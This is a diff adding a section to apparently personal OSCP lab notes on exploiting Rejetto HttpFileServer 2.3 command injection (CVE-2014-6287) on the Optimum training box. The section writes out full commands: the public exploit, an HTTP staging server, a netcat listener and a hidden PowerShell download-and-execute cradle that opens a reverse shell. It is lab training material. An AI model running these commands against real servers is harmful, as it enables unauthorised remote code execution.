@@ -374,3 +374,48 @@ Piece by piece:
 - The callback should reuse the same header only after the identity output is confirmed.
 
 The complete route is documented in [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] and [[COMMAND APPENDIX/Web Applications|Web Applications]].
+
+## Rejetto HttpFileServer 2.3 command injection
+
+Optimum is a useful Windows web foothold pattern: a precise service fingerprint maps to a public proof of concept, and the proof of concept accepts an arbitrary command. The exploit is reviewed and compiled locally before it is used to deliver a PowerShell callback.
+
+**Full commands:**
+
+```bash
+searchsploit -p 49125
+
+searchsploit -x 49125
+
+cp /usr/share/exploitdb/exploits/windows/webapps/49125.py \
+  "$BoxDir/exploits/49125.py"
+
+python3 -m py_compile "$BoxDir/exploits/49125.py"
+
+python3 -m http.server "$TransferPort" --directory "$BoxDir/www" \
+  2>&1 | tee "$BoxDir/logs/http-server.log"
+```
+
+In a second terminal, start the callback listener before sending the command. Then invoke the reviewed exploit with a PowerShell download-and-execute command:
+
+```bash
+nc -lvnp "$CallbackPort" 2>&1 | tee "$BoxDir/logs/callback.log"
+
+HfsCommand="powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/shell.ps1')\""
+
+python3 "$BoxDir/exploits/49125.py" "$BoxIP" "$WebPort" "$HfsCommand" \
+  2>&1 | tee "$BoxDir/logs/hfs-rce.log"
+```
+
+**Piece by piece:**
+
+- `searchsploit -x` is the source-review step. Confirm the target version and understand how the command is inserted before running the script.
+- `python3 -m py_compile` catches a damaged or incompatible local copy without contacting the target.
+- The Python HTTP server is only a staging channel. Keep its log separate from the exploit output and callback transcript.
+- `HfsCommand` contains the command that HFS will execute. The callback script is fetched by the target, so the target must be able to reach `$LocalIP:$TransferPort`.
+- The callback is the transition point. Run identity and host checks from the received shell before attempting local privilege escalation.
+
+**Gotcha:** a web-worker command context is not equivalent to a normal interactive user process. If a local Windows exploit appears silent from the HFS request, use the HFS primitive only to obtain a clean callback, then run the local exploit from that callback.
+
+🔁 **Seen in:** [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]], [[COMMAND APPENDIX/Web Applications|Web Applications]], and [[OSCP/RUNBOOK V2/Windows - Exploit Search|Windows - Exploit Search]].
+
+#### Tags: #HFS #Rejetto #CVE20146287 #Searchsploit #WindowsRCE #CommandBreakdowns
